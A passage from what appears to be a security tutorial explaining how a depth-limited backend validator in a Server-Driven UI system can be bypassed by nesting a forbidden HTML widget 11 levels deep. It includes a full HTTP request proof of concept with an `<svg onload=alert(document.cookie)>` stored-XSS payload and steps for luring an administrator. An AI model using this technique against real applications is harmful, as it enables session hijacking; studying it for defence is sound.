            if (Array.isArray(node.children)) {
                for (let child of node.children) {
                    if (!this.validateConfiguration(child, currentDepth + 1)) return false;
                }
            }
        }

        return true;
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The backend validator recursively analyzes the massive JSON object representing the user's custom dashboard configuration, \[2] To protect the backend microservice from recursive stack exhaustion and CPU starvation during high-volume configuration saves, the developer hardcodes a maximum traversal depth threshold, \[3] Within the safe depth window, the validator effectively identifies and destroys strictly forbidden widget types, acting as a robust security boundary, \[4] The logic increments the depth counter as it traverses the nested arrays. The fatal architectural mismatch occurs because the client-side SPA rendering engine (React/Vue) is not bound by this 10-layer depth limit. It will infinitely recurse until the entire JSON tree is mapped to the DOM. The attacker merely hides the forbidden payload deeper in the JSON graph than the backend is willing to look

```http
// 1. Attacker crafts a deeply nested Server-Driven UI payload.
// 2. The payload contains 11 layers of structural containers, bypassing the 10-layer validation limit.
POST /api/v1/workspaces/custom-dashboard HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <attacker-token>
Content-Type: application/json

{
  "type": "Container", "children": [
    { "type": "Row", "children": [
      { "type": "Column", "children": [
        { "type": "Grid", "children": [
          { "type": "Box", "children": [
            { "type": "Panel", "children": [
              { "type": "Section", "children": [
                { "type": "Div", "children": [
                  { "type": "Wrapper", "children": [
                    { "type": "Layer10", "children": [
                      { "type": "HtmlWidget", "content": "<svg onload=alert(document.cookie)>" }
                    ]}
                  ]}
                ]}
              ]}
            ]}
          ]}
        ]}
      ]}
    ]}
  ]}
}

// 3. The backend saves the dashboard.
// 4. Attacker shares the dashboard URL with an Administrator.
// 5. The Administrator's frontend recursively renders all 11 layers and detonates the forbidden widget.
```
{% endstep %}

{% step %}
To support extreme UI flexibility without pushing frequent application updates, the enterprise adopted a Server-Driven UI (SDUI) architecture. Developers enforced security by validating the JSON UI schema on the backend, specifically blacklisting widgets capable of executing raw HTML. However, to mitigate backend CPU exhaustion attacks caused by deeply nested JSON arrays, they implemented a shallow traversal optimization that abandoned validation past a specific depth. The attacker bypassed this security control by padding their malicious `HtmlWidget` with benign structural containers, pushing it entirely out of the validator's sight. The database stored the poisoned JSON graph. When an administrator accessed the workspace, the frontend React engine—which had no depth restrictions—recursively unwrapped the payload and dynamically mounted the forbidden component, resulting in a devastating Stored XSS execution and total session compromise
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
